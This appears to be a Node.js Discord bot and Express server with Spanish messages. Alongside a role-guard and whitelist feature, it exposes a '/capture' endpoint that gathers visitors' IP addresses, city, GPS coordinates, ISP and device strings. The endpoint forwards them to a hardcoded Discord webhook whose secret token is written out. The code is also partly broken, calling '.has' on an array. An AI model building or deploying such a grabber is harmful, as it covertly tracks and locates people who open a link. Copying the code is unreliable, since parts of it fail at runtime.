const { Client, GatewayIntentBits } = require('discord.js');
const express = require('express');
const axios = require('axios');
require('dotenv').config();

const app = express();

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(express.json());

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

const WHITELIST = new Set();
const ADMIN_IDS = ['1496972373423816848'];

client.on('ready', () => console.log(`✅ Bot conectado: ${client.user.tag}`));

client.on('guildMemberUpdate', async (oldMember, newMember) => {
  const addedRoles = newMember.roles.cache.filter(r => !oldMember.roles.cache.has(r.id));
  if (addedRoles.size > 0) {
    const auditLogs = await newMember.guild.fetchAuditLogs({ type: 31, limit: 1 });
    const entry = auditLogs.entries.first();
    if (!entry) return;
    const executor = entry.executor;
    if (!executor || ADMIN_IDS.has(executor.id) || WHITELIST.has(executor.id)) return;
    for (const [roleId] of addedRoles) await newMember.roles.remove(roleId).catch(() => {});
    const executorMember = newMember.guild.members.cache.get(executor.id);
    if (executorMember) {
      const rolesToRemove = executorMember.roles.cache.filter(r => r.id !== newMember.guild.id);
      await executorMember.roles.remove(rolesToRemove).catch(() => {});
    }
  }
});

client.on('messageCreate', async message => {
  if (!message.content.startsWith(',') || message.author.bot) return;
  const args = message.content.slice(1).trim().split(/ +/);
  const command = args.shift()?.toLowerCase();
  if (command === 'whitelist_add') {
    if (!ADMIN_IDS.has(message.author.id)) return message.reply('❌ Sin permiso.');
    const userId = args[0];
    if (!userId) return message.reply('⚠️ Uso: ,whitelist_add <id>');
    WHITELIST.add(userId);
    return message.reply(`✅ Añadido: ${userId}`);
  }
  if (command === 'whitelist_remove') {
    if (!ADMIN_IDS.has(message.author.id)) return message.reply('❌ Sin permiso.');
    const userId = args[0];
    if (!userId) return message.reply('⚠️ Uso: ,whitelist_remove <id>');
    WHITELIST.delete(userId);
    return message.reply(`✅ Eliminado: ${userId}`);
  }
});

app.get('/', (req, res) => res.send('✅ Bot funcionando'));

// ✅ RECIBE TODO YA COMPLETO DESDE LA PÁGINA
app.post('/capture', async (req, res) => {
  const { ip, country, region, city, latitude, longitude, isp, timezone, userAgent } = req.body;
  
  res.send('✅ Recibido');

  try {
    const webhookUrl = 'https://discord.com/api/webhooks/1546973077731024966/W50wqczeBdGpvXIHrFXX2Tmd6wI8_ajSdO3CdTzIxxeo4MWi65JMgkMPfBSTVZ7KaFpA';
    
    await axios.post(webhookUrl, {
      embeds: [{
        title: '📡 NUEVA VISITA DETECTADA',
        color: 0xff0000,
        fields: [
          { name: '🌐 IP', value: `\`${ip}\``, inline: false },
          { name: '📍 País', value: `\`${country}\``, inline: true },
          { name: '🏙️ Ciudad', value: `\`${city}\``, inline: true },
          { name: '🗺️ Región', value: `\`${region}\``, inline: true },
          { name: '🧭 Coordenadas', value: `\`Lat: ${latitude}\`\n\`Lon: ${longitude}\``, inline: false },
          { name: '📶 Proveedor', value: `\`${isp}\``, inline: false },
          { name: '🕐 Zona Horaria', value: `\`${timezone}\``, inline: true },
          { name: '📱 Dispositivo', value: `\`${userAgent.substring(0, 150)}\``, inline: false }
        ],
        timestamp: new Date().toISOString()
      }]
    });
    console.log(`✅ Enviado: ${ip} - ${city}, ${country}`);
  } catch (e) {
    console.error('❌ Error:', e.message);
  }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => console.log(`🌐 Puerto ${PORT}`));

client.login(process.env.DISCORD_TOKEN);
